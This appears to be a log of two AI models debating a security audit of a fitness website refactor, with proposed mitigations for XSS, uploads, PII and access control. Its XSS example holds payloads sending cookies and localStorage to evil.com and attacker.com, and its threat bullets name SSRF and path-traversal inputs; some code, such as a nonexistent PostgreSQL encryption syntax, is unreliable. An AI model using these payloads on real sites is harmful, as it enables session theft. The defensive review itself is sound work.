# Security Planning Analysis — Recursive Consensus Debate Log

> **Consensus:** YES — Models agreed
> **Rounds:** 2
> **Tokens:** 11,181 input / 7,542 output

---

## Primary Security Planner — Round 1

# SECURITY AUDIT REPORT: SwanStudios Homepage & About Page Vision Refactor

**Auditor:** Primary Security Lead  
**Plan:** `docs/ai-workflow/blueprints/HOMEPAGE-ABOUT-VISION-REFACTOR-2026-04-05.md`  
**Date:** 2026-04-05  
**Status:** **BLOCKED** — Critical security gaps identified. Do not proceed to implementation.

---

## EXECUTIVE SUMMARY

The submitted plan is a **content/copy refactor** with minimal direct code changes. However, the **vision document explicitly references AI-powered features** (voice transcription, image analysis, conversation history) that are **absent from the implementation plan** but represent **critical security liabilities** if implemented without proper controls.

**Key Findings:**
1. **PII Exposure Risk:** The AI Coach Assistant's conversation history and voice recordings will contain highly sensitive health/fitness data (PII/PHI) with **zero sanitization controls** described.
2. **XSS Vulnerability:** New markdown rendering capabilities for "Social Ecosystem" content introduce **critical client-side injection risks** without sanitization strategy.
3. **RBAC Gaps:** The "Global Trainer Platform" vision requires **multi-tenant data isolation** that is not reflected in current architecture.
4. **File Upload Attack Surface:** Image analysis via Cloudflare R2 lacks **any security controls** (validation, scanning, path traversal protection).
5. **Voice Data Privacy:** No consent mechanisms, retention policies, or encryption specifications for biometric voice data.

**Overall Verdict:** **REJECT** until security requirements are integrated into the implementation plan. The AI Village review questions correctly identify that **security must be designed into the AI workflow before any frontend changes proceed**.

---

## DETAILED SECURITY FINDINGS & MITIGATIONS

### 1. PII/PHI LEAKAGE IN AI CONVERSATION HISTORY

**Risk Rating:** 🔴 **CRITICAL**  
**Plan Relevance:** ⚠️ **Indirect** — Vision mentions "conversation history" but plan contains zero implementation details.

**Threat Scenario:**  
User asks AI Coach: *"What's a good workout for my knee replacement recovery?"*  
→ Conversation stored in PostgreSQL JSONB contains:  
- Medical condition (PHI)  
- Location (if user mentions "gym in [city]")  
- Trainer name (if user references their trainer)  
- Exact workout metrics (health data)  

If this data is:  
a) Sent to external LLM APIs **without redaction** → HIPAA/GDPR violation  
b) Stored without encryption at rest → Database breach exposes health history  
c) Lacks access controls → Any authenticated user could query others' conversations  

**Required Mitigations (MUST be in implementation plan):**

```typescript
// BEFORE any data leaves backend or is stored:
// 1. PII DETECTION & REDACTION (local, never send raw PII to LLMs)
import { PresidioAnalyzer } from '@microsoft/presidio';

const sanitizeConversation = async (text: string): Promise<string> => {
  const analyzer = new PresidioAnalyzer();
  const results = await analyzer.analyze(text, {
    language: 'en',
    categories: ['PERSON', 'LOCATION', 'MEDICAL_CONDITION', 'AGE']
  });
  
  let sanitized = text;
  for (const result of results) {
    sanitized = sanitized.replace(
      text.substring(result.start, result.end), 
      '[REDACTED]'
    );
  }
  return sanitized;
};

// 2. DATABASE ENCRYPTION (PostgreSQL pgcrypto)
// Schema must include:
//   conversation_history JSONB ENCRYPTED WITH (KEY = 'ai_chat_key')
//   voice_transcripts BYTEA ENCRYPTED

// 3. ROW-LEVEL SECURITY (RLS) policies:
//   CREATE POLICY user_is_owner ON conversations 
//   USING (auth.uid() = user_id);
```

**Implementation Plan Requirement:**  
Add a **"Security Requirements"** section specifying:
- PII detection library (Microsoft Presidio or AWS Comprehend Medical)
- Encryption keys management (AWS KMS / HashiCorp Vault)
- RLS policy enforcement on all conversation tables
- Audit logging for all conversation access

---

### 2. XSS VIA MARKDOWN RENDERING (Social Ecosystem)

**Risk Rating:** 🔴 **CRITICAL**  
**Plan Relevance:** ✅ **Direct** — "Beyond the Gym" section will render user-generated markdown content.

**Threat Scenario:**  
User posts in "Comedy" section:  
```markdown
![x](https://evil.com/steal?cookie=document.cookie)
<script>fetch('https://attacker.com/steal', {body: localStorage})</script>
```

If `react-markdown` renders without sanitization → **Stored XSS** stealing all user sessions.

**Required Mitigations:**

```typescript
// src/components/SanitizedMarkdown.tsx
import ReactMarkdown from 'react-markdown';
import rehypeSanitize from 'rehype-sanitize';
import { useMemo } from 'react';

const SanitizedMarkdown = ({ content }: { content: string }) => {
  const allowedElements = useMemo(() => ({
    // Only allow safe tags
    a: { href: true, title: true },
    p: true,
    ul: true,
    ol: true,
    li: true,
    strong: true,
    em: true,
    code: true,
    pre: true,
    img: { src: true, alt: true },
    // NO script, iframe, object, embed, etc.
  }), []);

  return (
    <ReactMarkdown
      rehypePlugins={[[rehypeSanitize, { allowedElements }]]}
      components={{
        // Custom renderers to enforce additional rules
        a: ({ href, children }) => (
          <a 
            href={href} 
            target="_blank" 
            rel="noopener noreferrer" // Prevent tabnabbing
          >
            {children}
          </a>
        ),
        img: ({ src, alt }) => (
          <img 
            src={src} 
            alt={alt || ''} 
            loading="lazy"
            // Add Content Security Policy (CSP) nonce if needed
          />
        )
      }}
    >
      {content}
    </ReactMarkdown>
  );
};
```

**Implementation Plan Requirement:**  
- Specify `rehype-sanitize` as a dependency  
- Define **strict allowlist** of markdown elements/attributes  
- Add **Content Security Policy (CSP)** headers:  
  `Content-Security-Policy: default-src 'self'; img-src https: data:; script-src 'self' 'nonce-{RANDOM}';`  
- **DO NOT** use `dangerouslySetInnerHTML` anywhere in new sections

---

### 3. FILE UPLOAD ATTACK VECTORS (Image Analysis to R2)

**Risk Rating:** 🔴 **CRITICAL**  
**Plan Relevance:** ⚠️ **Indirect** — Vision mentions "image uploads for AI analysis" but plan lacks controls.

**Threat Scenarios:**
- **Malicious File Upload:** User uploads `malware.exe` renamed as `workout.jpg` → Server executes if misconfigured
- **SSRF:** Upload contains `file:///etc/passwd` or `http://internal-server:8080/admin` → Cloudflare R2 or backend SSRF
- **Path Traversal:** `../../.env` in filename → Overwrites critical files
- **Storage Bucket Exposure:** R2 bucket set to public-read → All user images exposed

**Required Mitigations:**

```typescript
// backend/routes/upload.ts
import { pipeline } from 'stream/promises';
import { createHash } from 'crypto';
import { getSignedUrl } from '@aws-sdk/s3-request-presigner';

// 1. STRICT FILE TYPE VALIDATION (MAGIC BYTES, not extension)
const ALLOWED_MIME_TYPES = ['image/jpeg', 'image/png', 'image/webp'];

const validateFile = async (buffer: Buffer) => {
  const fileType = await fileTypeFromBuffer(buffer); // npm: file-type
  if (!ALLOWED_MIME_TYPES.includes(fileType?.mime || '')) {
    throw new Error('Invalid file type');
  }
};

// 2. VIRUS/MALWARE SCANNING (ClamAV or VirusTotal API)
const scanFile = async (buffer: Buffer) => {
  const scanResult = await clamav.scanBuffer(buffer);
  if (scanResult.isInfected) {
    throw new Error(`Malware detected: ${scanResult.viruses}`);
  }
};

// 3. SANITIZE FILENAMES & GENERATE UUIDs
const generateSafeFilename = (originalName: string) => {
  const ext = path.extname(originalName).toLowerCase();
  return `${uuidv4()}${ext}`; // Never use user-provided filename
};

// 4. R2 BUCKET POLICIES
// - Private by default (no public-read)
// - CORS restricted to sswanstudios.com only
// - Lifecycle rule: auto-delete after 30 days (unless flagged for AI analysis)
// - Server-side encryption: AES-256

// 5. SIZE LIMITS & RATE LIMITING
// - Max 10MB per file
// - 5 uploads/minute per user
// - Total storage quota per user: 1GB

// 6. PRESIGNED URL FLOW (never expose R2 credentials to client)
const presignedUrl = await getSignedUrl(r2Client, new PutObjectCommand({
  Bucket: 'swanstudios-uploads',
  Key: `uploads/${userId}/${safeFilename}`,
  ContentType: fileType.mime,
  ServerSideEncryption: 'AES256'
}), { expiresIn: 300 }); // 5 minutes
```

**Implementation Plan Requirement:**  
- Add **file upload security checklist** to plan  
- Specify **ClamAV integration** or commercial scanner  
- Define **R2 bucket policy** in infrastructure docs  
- Add **quota/rate limiting** in API design  

---

### 4. VOICE DATA PRIVACY & BIOMETRIC RISKS

**Risk Rating:** 🔴 **HIGH**  
**Plan Relevance:** ⚠️ **Indirect** — "Voice-first AI coach" mentioned in vision but not in plan.

**Threat Scenarios:**
- **Biometric Identity Theft:** Voice recordings contain unique biometric patterns → Could be used to impersonate user
- **Eavesdropping:** Accidental capture of background conversations (PII of others)
- **Retention Violation:** Storing voice indefinitely without consent
- **Insufficient Consent:** No explicit "I consent to voice processing" before recording

**Required Mitigations:**

```typescript
// 1. EXPLICIT CONSENT FLOW (GDPR/CCPA/BIOMETRIC LAWS)
const VoiceConsentModal = () => (
  <Modal>
    <h3>Voice Processing Consent</h3>
    <p>We will process your voice to:</p>
    <ul>
      <li>Transcribe workout logs</li>
      <li>Analyze form (optional)</li>
    </ul>
    <p><strong>We will NOT:</strong></p>
    <ul>
      <li>Sell your voice data</li>
      <li>Share with third parties without consent</li>
      <li>Store longer than 90 days unless flagged for review</li>
    </ul>
    <button onClick={giveConsent}>I Consent</button>
    <button onClick={denyConsent}>Use Text Only</button>
  </Modal>
);

// 2. LOCAL PROCESSING WHERE POSSIBLE (Web Speech API)
// Use browser's built-in speech recognition (Chrome/Edge) to avoid sending raw audio
if ('webkitSpeechRecognition' in window) {
  const recognition = new webkitSpeechRecognition();
  recognition.continuous = false;
  recognition.interimResults = false;
  // Audio never leaves device
}

// 3. IF CLOUD PROCESSING IS NEEDED:
// - Encrypt in transit (TLS 1.3)
// - Encrypt at rest (AES-256)
// - Auto-delete after 24h unless user explicitly saves transcript
// - Never store raw audio, only text transcripts (after PII redaction)

// 4. BIOMETRIC DATA HANDLING
// Illinois BIPA, Texas SB 1181, Washington HB 1653 require:
// - Written consent for biometric collection
// - Retention schedule (delete after purpose fulfilled)
// - Prohibition on selling/sharing
// Add to privacy policy: "Voice biometrics are used solely for authentication and are deleted after 30 days."
```

**Implementation Plan Requirement:**  
- Add **voice data processing addendum** to privacy policy  
- Implement **consent management** before any `MediaRecorder` starts  
- Specify **retention schedule** (e.g., raw audio: 24h, transcripts: 90d, redacted logs: indefinite)  
- Consider **local-only processing** for simple transcription  

---

### 5. ROLE-BASED ACCESS CONTROL (RBAC) GAPS

**Risk Rating:** 🟠 **HIGH**  
**Plan Relevance:** ✅ **Direct** — "Global Trainer Platform" implies multi-tenant data isolation.

**Current Gap:**  
The plan mentions "trainers bring their clients" but **no backend enforcement** described. Risk: Trainer A could access Trainer B's client data via API manipulation.

**Required Mitigations:**

```sql
-- PostgreSQL: Row-Level Security (RLS) policies
-- Users table
CREATE POLICY user_owns_profile ON users 
  USING (id = auth.uid());

-- Clients table (belongs to trainer)
CREATE POLICY trainer_owns_clients ON clients 
  USING (trainer_id = auth.uid());

-- Conversations table (belongs to user OR trainer's client)
CREATE POLICY conversation_access ON conversations 
  USING (
    user_id = auth.uid() OR 
    user_id IN (
      SELECT client_id FROM clients WHERE trainer_id = auth.uid()
    )
  );

-- Workout logs: same pattern
CREATE POLICY workout_access ON workout_logs 
  USING (
    user_id = auth.uid() OR 
    user_id IN (
      SELECT client_id FROM clients WHERE trainer_id = auth.uid()
    )
  );
```

**API Middleware:**
```typescript
// middleware/requireTrainer.ts
export const requireTrainer = async (req: Request, res: Response, next: NextFunction) => {
  const user = await getUser(req.user.id);
  if (user.role !== 'trainer') {
    return res.status(403).json({ error: 'Trainer access required' });
  }
  next();
};

// Usage:
router.get('/my-clients', requireTrainer, clientController.list);
```

**Implementation Plan Requirement:**  
- Define **role hierarchy**: `admin` > `trainer` > `user`

---

## Secondary Security Planner (120B MoE) — Round 2

CONSENSUS REACHED

The Secondary Security Planner (Nemotron 3 Super) agrees with all security findings and mitigations presented by the Primary Security Planner (Step 3.5 Flash). The following merged findings consolidate the agreed-upon requirements, preserving the Primary's detailed specifications while adding minor clarifications where beneficial for implementation clarity.

---

### MERGED SECURITY REQUIREMENTS FOR HOMEPAGE/ABOUT VISION REFACTOR

#### 1. PII/PHI LEAKAGE IN AI CONVERSATION HISTORY
**Agreed Mitigations (with clarifications):**
- **PII Detection & Redaction:** Implement Microsoft Presidio (or AWS Comprehend Medical if AWS-native) for real-time redaction of PERSON, LOCATION, MEDICAL_CONDITION, AGE categories before LLM transmission or storage. *Clarification:* Use regex fallback for low-resource environments (e.g., `\b\d{3}[-\s]?\d{2}[-\s]?\d{4}\b` for SSN-like patterns).
- **Database Encryption:** Enforce PostgreSQL `pgcrypto` encryption at rest for `conversation_history` (JSONB) and `voice_transcripts` (BYTEA) using keys managed via AWS KMS or HashiCorp Vault. *Clarification:* Rotate keys every 90 days; audit key usage via CloudTrail/Vault logs.
- **Row-Level Security (RLS):** Apply policies as specified:
  ```sql
  CREATE POLICY user_is_owner ON conversations 
  USING (auth.uid() = user_id);
  ```
  *Clarification:* Ensure `auth.uid()` is derived from a verified JWT (e.g., via Supabase Auth or custom middleware) and enable `row_security` on relevant tables.

#### 2. XSS VIA MARKDOWN RENDERING (Social Ecosystem)
**Agreed Mitigations (with clarifications):**
- **Sanitization Library:** Mandate `rehype-sanitize` with strict allowlist (as provided). *Clarification:* Extend `allowedElements` to include `blockquote` and `hr` if needed, but **exclude** `iframe`, `object`, `embed`, `form`, `input`. Additionally, configure `rehype-sanitize` to restrict URL schemes:
  ```javascript
  rehypePlugins: [[rehypeSanitize, {
    allowedElements: [...],
    allowedAttributes: { '*': ['class'], a: ['href', 'title'], img: ['src', 'alt', 'width', 'height'] },
    allowedSchemes: ['http', 'https', 'mailto'] // Block javascript:, data: (unless base64-encoded images vetted)
  }]]
  ```
- **CSP Header:** Enforce strict CSP as specified, adding `base-uri 'self';` and `object-src 'none';` to mitigate injection via `<object>` or `<base>` tags.
- **Custom Renderers:** Maintain `target="_blank" rel="noopener noreferrer"` for `<a>` tags to prevent tabnabbing.

#### 3. FILE UPLOAD ATTACK VECTORS (Image Analysis to R2)
**Agreed Mitigations (with clarifications):**
- **File Validation:** Use `file-type` for MIME validation (JPEG/PNG/WebP) *and* verify magic bytes against allowed signatures. *Clarification:* Reject files with mismatched extensions/MIME (e.g., `.jpg` with PDF signature).
- **Malware Scanning:** Integrate ClamAV (open-source) or VirusTotal API (commercial) as secondary scan. *Clarification:* For VirusTotal, use API key via AWS Secrets Manager; enforce 4-rescan threshold for positivity.
- **Filename Handling:** Generate UUIDv4 filenames *without* preserving user-provided extension; derive extension solely from validated MIME type (e.g., `image/jpeg` → `.jpg`). *Clarification:* Maintain a mapping table (UUID → original filename) for user display if required, but never store user input in filesystem/R2 keys.
- **R2 Bucket Policy:** Enforce:
  - Private bucket (no public-read)
  - CORS: Allow only `https://sswanstudios.com`
  - Lifecycle: Auto-delete after 30 days (or retain indefinitely if flagged for AI analysis with user consent)
  - Encryption: AES-256 (SSE-S3) or SSE-KMS with customer-managed key
- **Rate Limiting:** Implement per-user limits via API gateway (e.g., 5 uploads/min, 1GB/user quota) using Redis-backed counters.

#### 4. VOICE DATA PRIVACY & BIOMETRIC RISKS
**Agreed Mitigations (with clarifications):**
- **Consent Flow:** Deploy granular consent modal (as specified) *before* any `MediaRecorder` initialization. *Clarification:* Store consent receipt (timestamp, version, scope) in GDPR-compliant audit log; allow withdrawal via settings portal.
- **Local Processing Priority:** Use Web Speech API (Chrome/Edge/Safari) for transcription where available. *Clarification:* For Firefox/Safari limitations, fallback to server-side processing **only** with explicit consent and end-to-end encryption (see below).
- **Cloud Processing Safeguards:** If used:
  - Encrypt audio in transit (TLS 1.3) and at rest (AES-256 via KMS)
  - Auto-delete raw audio after 24h; retain transcripts max 90d unless user opts to save
  - Apply PII redaction (Per Finding #1) to transcripts before storage
- **Biometric Compliance:** Explicitly state in privacy policy: "Voice biometrics are used solely for session authentication and are deleted after 30 days." Align with BIPA/CCPA by retaining raw audio < 24h.

#### 5. ROLE-BASED ACCESS CONTROL (RBAC) GAPS
**Agreed Mitigations (with clarifications):**
- **RLS Policies:** Implement as specified for `users`, `clients`, `conversations`, `workout_logs`. *Clarification:* For `conversations`, extend policy to allow trainer access to client conversations:
  ```sql
  CREATE POLICY trainer_access ON conversations
  USING (
    user_id IN (
      SELECT client_id FROM clients WHERE trainer_id = auth.uid()
    )
  );
  ```
- **API Middleware:** Enforce role checks (e.g., `requireTrainer`) on all trainer-specific routes. *Clarification:* Use JWT role claims (e.g., `role: trainer`) verified at API gateway; supplement with DB checks for defense-in-depth.
- **Role Hierarchy:** Define in schema: `admin` (full access), `trainer` (manage own clients), `user` (self-only). *Clarification:* Prevent role escalation via strict validation on role-update endpoints (e.g., only `admin` can assign `trainer` role).

---

### IMPLEMENTATION TRACKING
All mitigations must be reflected in:
- **`docs/ai-workflow/blueprints/HOMEPAGE-ABOUT-VISION-REFACTOR-2026-04-05.md`**: Add a dedicated "Security Requirements" section (incorporating above).
- **`backend/security/`**: New directory for PII detection, upload scanning, and voice processing utilities.
- **`frontend/components/`**: `SanitizedMarkdown.tsx`, `VoiceConsentModal.tsx`.
- **`infrastructure/`**: R2 bucket policy (Terraform/Cloudflare Wrangler), CSP headers (via `_headers` or middleware), RLS migration scripts.

**Final Note:** The Primary's report is technically sound and actionable. The Secondary affirms that addressing these points is non-negotiable before proceeding to implementation. No further disputes are raised.

---

